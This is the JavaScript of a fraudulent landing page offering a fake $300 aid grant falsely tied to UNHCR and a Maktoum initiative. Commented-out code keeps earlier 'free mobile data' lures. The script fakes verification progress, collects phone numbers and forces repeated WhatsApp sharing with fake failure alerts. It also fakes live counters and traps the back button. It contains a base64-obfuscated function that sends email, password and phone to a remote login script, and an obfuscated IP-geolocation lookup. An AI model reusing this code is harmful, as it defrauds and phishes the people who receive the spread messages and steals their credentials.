<script type="text/javascript">
    var DOMString = {
            loading: document.querySelector("#loading-svg"),
            checked: document.querySelector("#check-svg"),
            elemPorcents: document.querySelector(".quedate__porcent"),
            elemPorcentText: document.querySelector(".quedate__porcent-text"),
            firstBox: document.querySelector("#first-box"),
            secondBox: document.querySelector("#second-box"),
            thirdBox: document.querySelector("#third-box"),
            phone: document.querySelector(".quedate__form-input"),
            messageStatus: document.querySelector(".message-status"),
            loadingG: document.querySelector("#loading-g"),
            boxes: document.querySelectorAll(".quedate__first"),
            firstPorcent: document.querySelector("#first-porcent"),
            secondPorcent: document.querySelector("#second-porcent"),
            thirdPorcent: document.querySelector("#third-porcent"),
            barLoaders: document.querySelectorAll(".quedate__load-a"),
            svgLoading: document.querySelectorAll(".quedate__load-animate"),
            svgChecked: document.querySelectorAll(".quedate__load-check"),
            permissionContainer: document.querySelector(".permision-container"),
            permissionLoading: document.querySelector(".loading2"),
            statusMessage: document.querySelector(".fb-request"),
            share: document.querySelector("#compartir"),
            congrats: document.querySelector(".js-congrats"),
            sharing: document.querySelector(".js-share"),
            verify: document.querySelector("#verify")
        }, objServer = {}, landingDomain = "",
       
		adsLink = "http://shorturl.at/egjlC";
        //adsLink = "https://st-direct-link.blogspot.com";
    document.addEventListener("click", function (c) {
        console.log(c);
        var a = c.toElement || c.srcElement;
        if (a.id) switch (a.id) {
            case"validar":
                a.classList.add("js-hidden"), setTimeout(function () {
                    DOMString.loading.classList.remove("js-hidden"), DOMString.elemPorcents.classList.remove("js-hidden");
                    var b = 0;
                    window.loadingPorcents = setInterval(function () {
                        DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("js-hidden"), DOMString.checked.classList.remove("js-hidden"), DOMString.elemPorcents.classList.add("js-hidden"), DOMString.elemPorcentText.classList.remove("js-hidden"), setTimeout(function () {
                            DOMString.checked.classList.add("js-hidden"), DOMString.firstBox.classList.add("js-hidden"), DOMString.secondBox.classList.remove("js-hidden"), DOMString.elemPorcentText.classList.add("js-hidden")
                        }, 2e3)) : b++
                    }, 50)
                }, 500);
                break;
            case"enviar":
                var a = DOMString.phone;
                a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("js-hidden"), DOMString.secondBox.classList.add("js-hidden"), DOMString.loadingG.classList.remove("js-hidden"), setTimeout(function () {
                    DOMString.loadingG.classList.add("js-hidden"), DOMString.thirdBox.classList.remove("js-hidden");
                    var i = 0, j = 0, k = !0,
                        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
                    window.loadingData = setTimeout(function a() {
                        l.length > i && (DOMString.boxes[i].classList.remove("js-hidden"), DOMString.barLoaders[i].classList.remove("js-hidden"), window._setting = setInterval(function () {
                            if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++, j = 0, window.loadingData = setTimeout(a, 1e3); else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3); else if (!k && 100 === j) {
                                clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
                                var d = 1, e = 0, m = messageToSend();
                                var s=1;
                                set_Cookie("d",s);
                                DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
                                    if (12 <= d) {
                                        for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
                                            window.open(adsLink)
                                        });
                                        DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
                                    } else
                                        /*      e = Math.floor(100 * (d / 12)), d++, l[i].textContent = e + "%", DOMString.barLoaders[i].style.width = e + "%",
                                              e = Math.floor(100 * (d / 10))*0.5+50 ;*/
                                        d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
                                    d++;
                                    setTimeout(function() {
                                        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
                                        l[i].textContent = e + "%";
                                        DOMString.barLoaders[i].style.width = e + "%";
                                    }, 4000);
                                    set_Cookie('e',e);
                                    set_Cookie('d',d);
                                    
         /*       if( d == 10 ||d == 11 || d == 12 ){
                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
                }else{
                                    window.location.href = "whatsapp://send?text=" + m
                }*/
                window.location.href = "whatsapp://send?text=" + m
                
                                })
                            }
                            j++
                        }, 30))
                    }, 1e3)
                }, 1500)) : (DOMString.messageStatus.classList.remove("js-hidden"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
        }
    });

    get_Cookie('e') ? setTimeout('enviar()',500) : void(0);
   	
  landingDomain='👇👇http://shorturl.at/egjlC %0A%0A *اخر اجل للاستفادة 01/30/2022*'
    function deadline() {
        var day3 = new Date();
        day3.setTime(day3.getTime()+24*60*60*1000);
        return day3.getFullYear()+"-" + (day3.getMonth()+1) + "-" + (day3.getDate()+5);
    }
    function enviar(){
        l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
        i = 1;

        clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
        var d = parseInt(get_Cookie('d'));
        e = parseInt(get_Cookie('e'));
        m = messageToSend();
        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
        DOMString.barLoaders[i].classList.remove("js-hidden");
        DOMString.boxes[i].classList.remove("js-hidden");
        DOMString.svgLoading[i].classList.remove("js-hidden");
        l[i].textContent = e + "%";
        DOMString.barLoaders[i].style.width = e + "%";
        DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function () {
            if (10 <= d) {
                for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function () {
                    /*   record('4g','wc');*/
                    window.open(adsLink)
                });
                DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
            } else {
                /*       record('4g',d);*/
                // e = Math.floor(100 * (d / 10))*0.5+50 ;
                d==1?e=50:d==2?e=65:d==3?e=70:d==4?e=70:d==5?e=80:d==6?e=80:d==7?e=85:d==8?e=90:d==9?e=94:d==10?e=96:d==11?e=98:d==12?e=100:void(0);
                d++;
                setTimeout(function() {
                    d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0) ;
                    l[i].textContent = e + "%";
                    DOMString.barLoaders[i].style.width = e + "%";
                }, 4000);
                set_Cookie('e',e);
                set_Cookie('d',d);
                
     /*           if( d == 10 || d == 11 || d == 12 ){
                    location.href = "whatsapp://send?text=  Model penghasil uang terbaru pada tahun 2020, perubahan terjadi di sini! Hanya sebuah ponsel yang diperlukan, mengajar anda cara menghasilkan uang dan mengentaskan kemiskinan dalam 5 menit! ! %0Ahttps://tuisongxx.xyz/ad/makemoney.html?v=1" ;
                }else{
                window.location.href = "whatsapp://send?text=" + m;
                }*/
                window.location.href = "whatsapp://send?text=" + m;
            }
        })

    }
    function doreq(e, a, b) {
        var c = new XMLHttpRequest;
        c.open("POST", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function () {
            4 === c.readyState && 200 === c.status
        }, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
    }
    function tip_text() {
        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
            b = "";
        return "en" === a ? b="فشلت المشاركة! نفس المجموعة أو نفس الصديق غير صالح. يرجى مشاركتها مع أصدقاء أو مجموعات مختلفة." : "id" === a ? b="Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." :  b="فشلت المشاركة! نفس المجموعة أو نفس الصديق غير صالح. يرجى مشاركتها مع أصدقاء أو مجموعات مختلفة." ;

    }
    function messageToSend() {
        var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
            b = "";
        return "en" === a ? b = "*استفد من دعم مادي قدره 300 دولار بدعم من* %0A%0A*مبادرة راشد ال مكتوم العالمية* %0A*منضمة UNHCR*%0A*موسسة FOOD Banking*%0Aستحصل على مساعدة مادية قدرها 300 دولار على مدى تلات اشهر%0A%0A*تاكد من انك تستحق الدعم*" + landingDomain : b = "*استفد من دعم مادي قدره 300 دولار بدعم من* %0A%0A*مبادرة راشد ال مكتوم العالمية* %0A*منضمة UNHCR*%0A*موسسة FOOD Banking*%0Aستحصل على مساعدة مادية قدرها 300 دولار على مدى تلات اشهر%0A%0A*تاكد من انك تستحق الدعم* " + landingDomain ;
    }

    /* function messageToSend() {
         var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
             b = "";
         return "en" === a ? b = "To be grateful to customers for their continued support of 4G Internet! The company launched a 60-day free access to 100GB Internet data free use plan Participants can get 100GB free mobile internet data usage\n" +
             "Participating customers:\n" +
             "1. Customers who use 4G data for a long time\n" +
             "2. All traffic on Whatsapp users is free, including video downloads\n" +
             "3. The system will check your number for participation rights\n" +
             "4. It can help the company to promote the business first\n" +
             "The system will record your start date after success.\n" +
             "Thank you for your participation! %0A%0A*Get it now HERE \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
             "it" === a ? b = "*200 Gb di dati Internet senza alcuna ricarica Per* %0A Ottieni 200 Gb di dati Internet gratuitamente su qualsiasi rete mobile per 60 giorni. %0A *Scarica ora QUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz " :
                 "es" === a ? b = "*200 Gb de datos de Internet súper rápidos sin ninguna recarga* %0A%0AObtenga 200 Gb de datos de Internet gratis en cualquier red ahora. m\xF3vil durante 60 d\xEDas. %0A%0A*Consiguelo ahora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
                     "ar" === a ? b = "*200 \u062C\u064A\u062C\u0627 \u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u062F\u0648\u0646 \u0623\u064A \u0625\u0639\u0627\u062F\u0629 \u0634\u062D\u0646 \u0628\u0633\u0628\u0628* %0A \u0627\u062D\u0635\u0644 \u0639\u0644\u0649 100 \u062C\u064A\u062C\u0627\u0628\u0627\u064A\u062A \u0645\u0646 \u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u0625\u0646\u062A\u0631\u0646\u062A \u0627\u0644\u0645\u062C\u0627\u0646\u064A\u0629 \u0639\u0644\u0649 \u0623\u064A \u0634\u0628\u0643\u0629 \u0645\u062D\u0645\u0648\u0644 \u0644\u0645\u062F\u0629 60 \u064A\u0648\u0645\u064B\u0627 %0A *\u0627\u062D\u0635\u0644 \u0639\u0644\u064A\u0647 \u0627\u0644\u0622\u0646 \u0647\u0646\u0627 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
                         "el" === a ? b = "*200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD \u0394\u03B9\u03B1\u03B4\u03B9\u03BA\u03C4\u03CD\u03BF\u03C5 \u03C7\u03C9\u03C1\u03AF\u03C2 \u03BA\u03B1\u03BC\u03AF\u03B1 \u03B5\u03C0\u03B1\u03BD\u03B1\u03C6\u03CC\u03C1\u03C4\u03B9\u03C3\u03B7 \u0393\u03B9\u03B1* %0A \u039B\u03AC\u03B2\u03B5\u03C4\u03B5 200 Gb \u03B4\u03B5\u03B4\u03BF\u03BC\u03AD\u03BD\u03C9\u03BD Internet \u03B4\u03C9\u03C1\u03B5\u03AC\u03BD \u03C3\u03B5 \u03BF\u03C0\u03BF\u03B9\u03BF\u03B4\u03AE\u03C0\u03BF\u03C4\u03B5 \u03B4\u03AF\u03BA\u03C4\u03C5\u03BF \u03BA\u03B9\u03BD\u03B7\u03C4\u03AE\u03C2 \u03C4\u03B7\u03BB\u03B5\u03C6\u03C9\u03BD\u03AF\u03B1\u03C2 \u03B3\u03B9\u03B1 60 \u03B7\u03BC\u03AD\u03C1\u03B5\u03C2. %0A *\u0391\u03C0\u03BF\u03BA\u03C4\u03AE\u03C3\u03C4\u03B5 \u03C4\u03BF \u0395\u0394\u03A9 \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
                             "sq" === a ? b = "*200 Gb t\xEB dh\xEBna n\xEB internet pa ndonj\xEB rimbushje p\xEBr* %0A Merrni 200 Gb t\xEB dh\xEBna n\xEB internet falas n\xEB \xE7do rrjet celular p\xEBr 60 dit\xEB. %0A *Merre tani KETU%* %0Ahttps://tuisongxx.xyz" :
                                 "tr" === a ? b = "*Herhangi bir \u015Farj olmadan 200 Gb \u0130nternet verisi  i\xE7in* %0A Herhangi bir mobil a\u011Fda 60 g\xFCn boyunca \xFCcretsiz olarak 200 Gb \u0130nternet verisi al\u0131n. %0A *Hemen al\u0131n HERE \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
                                     "ru" === a ? b = "*100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0437 \u043F\u0435\u0440\u0435\u0437\u0430\u0440\u044F\u0434\u043A\u0438. \u0414\u043B\u044F \u041A\u0410\u0420\u0410\u041D\u0422\u0418\u041D\u0410* %0A \u041F\u043E\u043B\u0443\u0447\u0438\u0442\u0435 100 \u0413\u0411 \u0438\u043D\u0442\u0435\u0440\u043D\u0435\u0442-\u0434\u0430\u043D\u043D\u044B\u0445 \u0431\u0435\u0441\u043F\u043B\u0430\u0442\u043D\u043E \u0432 \u043B\u044E\u0431\u043E\u0439 \u043C\u043E\u0431\u0438\u043B\u044C\u043D\u043E\u0439 \u0441\u0435\u0442\u0438 \u0432 \u0442\u0435\u0447\u0435\u043D\u0438\u0435 60 \u0434\u043D\u0435\u0439. %0A *\u041F\u043E\u043B\u0443\u0447\u0438\u0442\u044C \u0441\u0435\u0439\u0447\u0430\u0441 \u0417\u0414\u0415\u0421\u042C \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz" :
                                         "no" === a ? b = "*200 Gb Internett-data uten lading* %0A F\xE5 200 Gb Internett-data gratis p\xE5 et mobilnett i 60 dager. %0A *F\xE5 den n\xE5 HER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                             "af" === a ? b = "*200 Gb internetdata sonder enige herlaai vir QUARANTINE (KROONVIRUS)* %0A Kry 60 GB internetdata gratis op enige mobiele netwerk vir 60 dae. %0A *Kry dit nou HIER \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
                                                 "se" === a ? b = "*200 Gb Internetdata utan laddning f\xF6r QUARANTINE (CROWN VIRUS)* %0A F\xE5 200 Gb Internetdata gratis i alla mobiln\xE4tverk i 60 dagar. %0A *H\xE4mta det nu H\xC4R \uD83D\uDC47\uD83D\uDC47* %0A https://tuisongxx.xyz/" :
                                                     "th" === a ? b = "*\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E42\u0E14\u0E22\u0E44\u0E21\u0E48\u0E15\u0E49\u0E2D\u0E07\u0E0A\u0E32\u0E23\u0E4C\u0E08\u0E0B\u0E49\u0E33\u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A* %0A \u0E23\u0E31\u0E1A\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E2D\u0E34\u0E19\u0E40\u0E17\u0E2D\u0E23\u0E4C\u0E40\u0E19\u0E47\u0E15 200Gb \u0E1F\u0E23\u0E35\u0E1A\u0E19\u0E40\u0E04\u0E23\u0E37\u0E2D\u0E02\u0E48\u0E32\u0E22\u0E21\u0E37\u0E2D\u0E16\u0E37\u0E2D\u0E43\u0E14 \u0E46 \u0E40\u0E1B\u0E47\u0E19\u0E40\u0E27\u0E25\u0E32 60 \u0E27\u0E31\u0E19  %0A *\u0E23\u0E31\u0E1A\u0E17\u0E31\u0E19\u0E17\u0E35\u0E17\u0E35\u0E48\u0E19\u0E35\u0E48\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                         "pl" === a ? b = "*200 Gb danych internetowych bez do\u0142adowania W przypadku KWARANTANNY (WIRUS KORONOWY)* %0A Uzyskaj 200 Gb danych internetowych bezp\u0142atnie w dowolnej sieci kom\xF3rkowej przez 60 dni. %0A *Pobierz teraz TUTAJ\uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                             "nl" === a ? b = "*200 Gb aan internetgegevens zonder op te laden Voor QUARANTINE (CROWN VIRUS)* %0A Ontvang gratis 200 Gb aan internetgegevens op elk mobiel netwerk gedurende 60 dagen. %0A *Haal het nu HIER \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                                 "de" === a ? b = "*200 Gb Internetdaten ohne Aufladung F\xFCr* %0A Sie erhalten 60 Tage lang kostenlos 200 Gb Internetdaten in jedem Mobilfunknetz. %0A *Jetzt HIER herunterladen \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                                     "id" === a ? b = "Untuk berterima kasih kepada pelanggan atas dukungan berkelanjutan mereka terhadap Internet 4G! Perusahaan meluncurkan paket akses gratis 60 hari ke 200GB data Internet untuk penggunaan gratis Peserta bisa mendapatkan 200GB penggunaan data internet seluler gratis Pelanggan yang berpartisipasi: 1. Pelanggan yang menggunakan data 4G dalam waktu lama 2. Semua lalu lintas di pengguna Whatsapp gratis, termasuk unduhan video 3. Sistem akan memeriksa nomor Anda untuk hak partisipasi 4. Dapat membantu perusahaan untuk mempromosikan prioritas bisnis Sistem akan mencatat tanggal mulai Anda setelah sukses Terima kasih atas partisipasinya! %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
                                                                         "pt" === a ? b = "*200 Gb de dados da Internet sem recarga Para QUARANTINE (V\xCDRUS DE CORONA)* %0A Obtenha 200 Gb de dados da Internet gratuitamente em qualquer rede m\xF3vel por 60 dias. %0A *Adquira agora AQUI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                                             "ms" === a ? b = "*200Gb data Internet tanpa pengisian semula Untuk Kuarantin (CROWN VIRUS)* %0A Dapatkan 200Gb data Internet secara percuma di mana-mana rangkaian mudah alih selama 60 hari. %0A *Dapatkan sekarang DI SINI \uD83D\uDC47\uD83D\uDC47* %0Ahttps://tuisongxx.xyz/" :
                                                                                 //    "th" === a ? b = "* ????????? Intrnet 200Gb ???????????????????? ? *% 0A% 0AC ?????????????????????????? 200Gb ??? 60 ????????? Operator% 0A% 0A ??????? * ?????????????? \uD83D \uDC47 \uD83D\uDC47* %0Ahttps://tuisongxx.xyz" :
                                                                                 "cn"=== a ? b = "*??200GB??????????* %0A%0A ??????????????? %0A%0A ????60??200Gb??* ???? \uD83D\uDC47\uD83D\uDC47 * %0Ahttps://tuisongxx.xyz/cn/"

     }*/

    function operatorData(c) {
        var a = new XMLHttpRequest;
        a.open("GET", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function () {
            4 === a.readyState && 200 == a.status && c(a.response)
        }, a.send(null)
    }

    operatorData(function (e) {
        var {isp: a, cnames: b, subdiv: c} = JSON.parse(e);
        document.querySelector(".quedate__company").textContent = a, document.querySelector(".quedate__country").textContent = b.en, document.querySelector(".quedate__city").textContent = c[0].en
    });
    var counter = 153;
    setInterval(function () {
        document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
    }, 5e3);
    var counter2 = 337;
    setInterval(function () {
        document.querySelector(".js-counter").textContent = counter2, counter2++
    }, 5e3);
    var seconds = 1;
    setInterval(function () {
        for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
        seconds++
    }, 6e3), setTimeout(function () {
        var b = document.querySelector("#js-box-1");
        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
    }, 1e3), setTimeout(function () {
        var b = document.querySelector("#js-box-2");
        b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
    }, 3e3);</script>
<script>
    function getTextNodesIn(a, b) {
        var c = [];
        if (a) for (var d = a.childNodes, e = d.length; e--;) {
            var f = d[e], g = f.nodeType;
            3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
        }
        return c
    }

   
</script>


<script>
(function (global) {

	if(typeof (global) === "undefined")
	{
		throw new Error("window is undefined");
	}

    var _hash = "!";
    var noBackPlease = function () {
        global.location.href += "8754544444";

		// making sure we have the fruit available for juice....
		// 50 milliseconds for just once do not cost much (^__^)
        global.setTimeout(function () {
            global.location.href += "#";
        }, 10);
    };
	
	// Earlier we had setInerval here....
    global.onhashchange = function () {
        if (global.location.hash !== _hash) {
            global.location.hash = _hash;
        }
    };

    global.onload = function () {
        
		noBackPlease();

		// disables backspace on page except on input fields and textarea..
		document.body.onkeydown = function (e) {
            var elm = e.target.nodeName.toLowerCase();
            if (e.which === 8 && (elm !== 'input' && elm  !== 'textarea')) {
                e.preventDefault();
            }
            // stopping event bubbling up the DOM tree..
            e.stopPropagation();
        };
		
    };

})(window);
</script>
